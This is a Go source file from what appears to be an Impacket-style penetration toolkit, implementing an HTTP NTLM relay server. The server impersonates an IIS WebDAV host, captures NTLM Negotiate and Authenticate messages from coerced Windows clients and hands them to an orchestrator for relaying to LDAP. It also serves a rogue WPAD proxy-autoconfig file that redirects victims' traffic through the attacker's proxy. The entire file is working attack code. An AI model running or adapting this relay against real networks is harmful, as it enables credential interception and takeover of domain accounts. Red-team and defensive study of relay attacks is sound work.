// SPDX-License-Identifier: Apache-2.0

package relay

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"net/http"
	"strings"
	"sync"

	"gopacket/internal/build"
)

// HTTPRelayServer listens for incoming HTTP connections and captures
// NTLM authentication via WWW-Authenticate/Authorization headers.
// Used for WebDAV/WPAD coercion → LDAP relay attacks.
type HTTPRelayServer struct {
	listenAddr string
	server     *http.Server
	listener   net.Listener
	authCh     chan<- AuthResult
	config     *Config // for WPAD settings

	// Per-connection NTLM state (keyed by remote addr)
	mu       sync.Mutex
	sessions map[string]*httpNTLMSession

	// WPAD request counter per client IP (matches Impacket wpad_counters)
	wpadCounters map[string]int
}

// httpNTLMSession tracks the NTLM handshake state for a single HTTP connection.
type httpNTLMSession struct {
	auth   AuthResult
	step   int    // 0=waiting for Type1, 1=waiting for Type3, 2=done
	method string // HTTP method that started the auth (for PROPFIND response)
}

// NewHTTPRelayServer creates a new HTTP relay server.
func NewHTTPRelayServer(listenAddr string, config *Config) *HTTPRelayServer {
	return &HTTPRelayServer{
		listenAddr:   listenAddr,
		config:       config,
		sessions:     make(map[string]*httpNTLMSession),
		wpadCounters: make(map[string]int),
	}
}

// Start begins listening for HTTP connections, implements ProtocolServer.
func (s *HTTPRelayServer) Start(resultChan chan<- AuthResult) error {
	ln, err := net.Listen("tcp", s.listenAddr)
	if err != nil {
		return fmt.Errorf("failed to listen on %s: %v", s.listenAddr, err)
	}
	s.listener = ln
	s.authCh = resultChan

	s.server = &http.Server{
		Handler: s,
		// ConnState callback to clean up sessions when connections close
		ConnState: func(conn net.Conn, state http.ConnState) {
			if state == http.StateClosed || state == http.StateHijacked {
				s.mu.Lock()
				delete(s.sessions, conn.RemoteAddr().String())
				s.mu.Unlock()
			}
		},
	}

	log.Printf("[*] HTTP relay server listening on %s", s.listenAddr)

	go func() {
		if err := s.server.Serve(ln); err != nil && err != http.ErrServerClosed {
			if build.Debug {
				log.Printf("[D] HTTP relay server: serve error: %v", err)
			}
		}
	}()

	return nil
}

// Stop closes the HTTP server, implements ProtocolServer.
func (s *HTTPRelayServer) Stop() error {
	if s.server != nil {
		return s.server.Close()
	}
	return nil
}

// setDAVHeaders adds WebDAV headers to a response so WebClient recognizes us as DAV server.
func setDAVHeaders(w http.ResponseWriter) {
	w.Header().Set("DAV", "1,2,3")
	w.Header().Set("Connection", "keep-alive")
	w.Header().Set("Content-Type", "text/html")
	w.Header().Set("Server", "Microsoft-IIS/10.0")
	w.Header().Set("Public", "OPTIONS, GET, HEAD, POST, PUT, DELETE, MKCOL, PROPFIND, PROPPATCH, MOVE, COPY, LOCK, UNLOCK")
	w.Header().Set("Allow", "OPTIONS, GET, HEAD, POST, PUT, DELETE, MKCOL, PROPFIND, PROPPATCH, MOVE, COPY, LOCK, UNLOCK")
}

// sendAuthChallenge sends a 401 response requesting NTLM authentication.
// If ntlmChallenge is non-empty, it's included as the Type2 challenge blob.
func sendAuthChallenge(w http.ResponseWriter, ntlmChallenge string) {
	setDAVHeaders(w)
	if ntlmChallenge != "" {
		w.Header().Set("WWW-Authenticate", "NTLM "+ntlmChallenge)
	} else {
		w.Header().Set("WWW-Authenticate", "NTLM")
	}
	w.Header().Set("Content-Length", "0")
	w.WriteHeader(401)
}

// sendPROPFINDResponse sends a proper WebDAV 207 Multi-Status response.
// This signals to WebClient that the resource exists and the auth was accepted.
func sendPROPFINDResponse(w http.ResponseWriter, path string) {
	if path == "" {
		path = "/"
	}
	body := fmt.Sprintf(`<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:">
<D:response>
<D:href>%s</D:href>
<D:propstat>
<D:prop>
<D:creationdate>2024-01-01T00:00:00Z</D:creationdate>
<D:getlastmodified>Sat, 01 Jan 2024 00:00:00 GMT</D:getlastmodified>
<D:resourcetype><D:collection/></D:resourcetype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>`, path)

	w.Header().Set("Content-Type", "text/xml")
	setDAVHeaders(w)
	w.WriteHeader(207)
	w.Write([]byte(body))
}

// extractNTLMFromAuthHeader extracts raw NTLM bytes from an Authorization header.
// Supports both "NTLM <base64>" and "Negotiate <base64>" schemes.
// When "Negotiate" is used, the token may be raw NTLM or SPNEGO-wrapped NTLM.
func extractNTLMFromAuthHeader(authHeader string) ([]byte, error) {
	var b64Data string

	if strings.HasPrefix(authHeader, "NTLM ") {
		b64Data = authHeader[5:]
	} else if strings.HasPrefix(authHeader, "Negotiate ") {
		b64Data = authHeader[10:]
	} else {
		return nil, fmt.Errorf("unsupported auth scheme: %.30s", authHeader)
	}

	data, err := base64.StdEncoding.DecodeString(b64Data)
	if err != nil {
		return nil, fmt.Errorf("base64 decode failed: %v", err)
	}
	if len(data) < 12 {
		return nil, fmt.Errorf("token too short: %d bytes", len(data))
	}

	// Check if this is raw NTLMSSP
	if string(data[:7]) == "NTLMSSP" && data[7] == 0 {
		return data, nil
	}

	// Check if this is SPNEGO-wrapped NTLM (starts with 0x60 APPLICATION tag)
	// Try to unwrap the SPNEGO to get the raw NTLM token
	if data[0] == 0x60 {
		// SPNEGO NegTokenInit — extract MechToken which should be NTLMSSP
		token, err := decodeNegTokenInit(data)
		if err == nil && len(token) >= 12 && string(token[:7]) == "NTLMSSP" {
			if build.Debug {
				log.Printf("[D] HTTP relay server: unwrapped SPNEGO NegTokenInit → NTLMSSP (%d bytes)", len(token))
			}
			return token, nil
		}
	}

	// NegTokenResp (0xa1 tag) — Type3 in Negotiate scheme
	if data[0] == 0xa1 {
		token, err := decodeNegTokenResp(data)
		if err == nil && len(token) >= 12 && string(token[:7]) == "NTLMSSP" {
			if build.Debug {
				log.Printf("[D] HTTP relay server: unwrapped SPNEGO NegTokenResp → NTLMSSP (%d bytes)", len(token))
			}
			return token, nil
		}
	}

	return nil, fmt.Errorf("not NTLMSSP (first bytes: %x)", data[:min(8, len(data))])
}

// ServeHTTP handles each HTTP request in the NTLM authentication flow.
func (s *HTTPRelayServer) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	remoteAddr := r.RemoteAddr

	if build.Debug {
		log.Printf("[D] HTTP relay server: %s %s from %s", r.Method, r.URL.Path, remoteAddr)
	}

	// Respond to OPTIONS with 200 + DAV headers (WebDAV discovery probe).
	// WebClient checks DAV capability before attempting auth.
	if r.Method == "OPTIONS" {
		if build.Debug {
			log.Printf("[D] HTTP relay server: responding 200 to OPTIONS for %s", remoteAddr)
		}
		setDAVHeaders(w)
		w.Header().Set("Content-Length", "0")
		w.WriteHeader(200)
		return
	}

	// WPAD serving: respond with wpad.dat when requested (matches Impacket -wh flag).
	// Uses a per-client-IP counter (wpad_counters) matching Impacket's should_serve_wpad().
	// The counter increments on every /wpad.dat request. Once it reaches wpad_auth_num,
	// the PAC is served regardless of auth headers.
	if s.config != nil && s.config.WPADHost != "" {
		lowerPath := strings.ToLower(r.URL.Path)
		if lowerPath == "/wpad.dat" || lowerPath == "/proxy.pac" {
			// Extract client IP (strip port) for counter key
			clientIP := remoteAddr
			if host, _, err := net.SplitHostPort(remoteAddr); err == nil {
				clientIP = host
			}

			// Increment WPAD counter and check threshold (matches Impacket exactly)
			s.mu.Lock()
			num := s.wpadCounters[clientIP]
			s.wpadCounters[clientIP] = num + 1
			s.mu.Unlock()

			if num >= s.config.WPADAuthNum {
				// Threshold reached — serve WPAD PAC file
				log.Printf("[*] HTTP: Serving PAC file to client %s", clientIP)
				wpadContent := fmt.Sprintf(
					"function FindProxyForURL(url, host){if ((host == \"localhost\") || shExpMatch(host, \"localhost.*\") "+
						"||(host == \"127.0.0.1\") || isPlainHostName(host)) return \"DIRECT\"; "+
						"if (dnsDomainIs(host, \"%s\") || (host == \"%s\")) return \"PROXY %s:%d; DIRECT\"; "+
						"return \"DIRECT\";}",
					s.config.WPADHost, s.config.WPADHost, s.config.WPADHost, s.config.HTTPPort)

				w.Header().Set("Content-Type", "application/x-ns-proxy-autoconfig")
				w.Header().Set("Content-Length", fmt.Sprintf("%d", len(wpadContent)))
				w.WriteHeader(200)
				w.Write([]byte(wpadContent))
				return
			}

			// Below threshold — fall through to normal NTLM auth handling
			if build.Debug {
				log.Printf("[D] HTTP: WPAD request from %s, prompting for auth (%d/%d)", clientIP, num+1, s.config.WPADAuthNum)
			}
		}
	}

	authHeader := r.Header.Get("Authorization")

	// No auth header — send 401 with NTLM challenge.
	// Only offer "NTLM" (not "Negotiate") to avoid SPNEGO/Kerberos attempts.
	// WebClient will use raw NTLM when only "NTLM" is offered.
	if authHeader == "" {
		if build.Debug {
			log.Printf("[D] HTTP relay server: sending 401 NTLM challenge to %s", remoteAddr)
		}
		sendAuthChallenge(w, "")
		return
	}

	// Extract NTLM token from Authorization header.
	// Supports both "NTLM <base64>" and "Negotiate <base64>" schemes.
	ntlmData, err := extractNTLMFromAuthHeader(authHeader)
	if err != nil {
		if build.Debug {
			log.Printf("[D] HTTP relay server: failed to extract NTLM from %s: %v", remoteAddr, err)
		}
		sendAuthChallenge(w, "")
		return
	}

	// Message type at offset 8
	msgType := binary.LittleEndian.Uint32(ntlmData[8:12])

	switch msgType {
	case 1: // NTLM Type 1 (Negotiate)
		s.handleType1(w, r, ntlmData, remoteAddr)
	case 3: // NTLM Type 3 (Authenticate)
		s.handleType3(w, r, ntlmData, remoteAddr)
	default:
		if build.Debug {
			log.Printf("[D] HTTP relay server: unexpected NTLM message type %d from %s", msgType, remoteAddr)
		}
		w.WriteHeader(400)
	}
}

// handleType1 processes an NTLM Type 1 negotiate from the HTTP client.
func (s *HTTPRelayServer) handleType1(w http.ResponseWriter, r *http.Request, ntlmType1 []byte, remoteAddr string) {
	log.Printf("[*] HTTP: NTLM Type 1 from %s (%s %s)", remoteAddr, r.Method, r.URL.Path)

	// Create auth result and push to orchestrator
	auth := AuthResult{
		NTLMType1:  ntlmType1,
		SourceAddr: remoteAddr,
		Type2Ch:    make(chan []byte, 1),
		Type3Ch:    make(chan []byte, 1),
		ResultCh:   make(chan bool, 1),
	}

	// Store session for this connection
	s.mu.Lock()
	s.sessions[remoteAddr] = &httpNTLMSession{auth: auth, step: 1, method: r.Method}
	s.mu.Unlock()

	// Send to orchestrator
	s.authCh <- auth

	// Wait for Type 2 challenge from orchestrator
	type2, ok := <-auth.Type2Ch
	if !ok || type2 == nil {
		log.Printf("[-] HTTP relay: no challenge received for %s", remoteAddr)
		w.WriteHeader(503)
		return
	}

	// Send Type 2 back to client as base64-encoded NTLM challenge
	type2B64 := base64.StdEncoding.EncodeToString(type2)
	sendAuthChallenge(w, type2B64)

	if build.Debug {
		log.Printf("[D] HTTP relay server: sent Type 2 challenge (%d bytes) to %s", len(type2), remoteAddr)
	}
}

// handleType3 processes an NTLM Type 3 authenticate from the HTTP client.
func (s *HTTPRelayServer) handleType3(w http.ResponseWriter, r *http.Request, ntlmType3 []byte, remoteAddr string) {
	s.mu.Lock()
	sess, ok := s.sessions[remoteAddr]
	if ok {
		delete(s.sessions, remoteAddr)
	}
	s.mu.Unlock()

	if !ok || sess.step != 1 {
		if build.Debug {
			log.Printf("[D] HTTP relay server: unexpected Type 3 from %s (no session)", remoteAddr)
		}
		sendAuthChallenge(w, "")
		return
	}

	domain, user := extractNTLMType3Info(ntlmType3)
	log.Printf("[*] HTTP: NTLM Type 3 from %s\\%s @ %s", domain, user, remoteAddr)

	// Detect anonymous/empty credentials from coercion
	if user == "" {
		log.Printf("[!] HTTP: Empty username from %s — likely anonymous NTLM (WebClient not sending machine creds)", remoteAddr)
		log.Printf("[!] Check: WebClient service running? Target in Intranet zone? Try hostname instead of IP.")
		sendAuthChallenge(w, "")
		return
	}

	// Send Type 3 to orchestrator
	sess.auth.Type3Ch <- ntlmType3

	// Wait for result
	success := <-sess.auth.ResultCh

	if success {
		// Send appropriate response based on the HTTP method
		if sess.method == "PROPFIND" {
			sendPROPFINDResponse(w, r.URL.Path)
		} else {
			setDAVHeaders(w)
			w.Header().Set("Content-Length", "2")
			w.WriteHeader(200)
			w.Write([]byte("OK"))
		}
	} else {
		sendAuthChallenge(w, "")
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
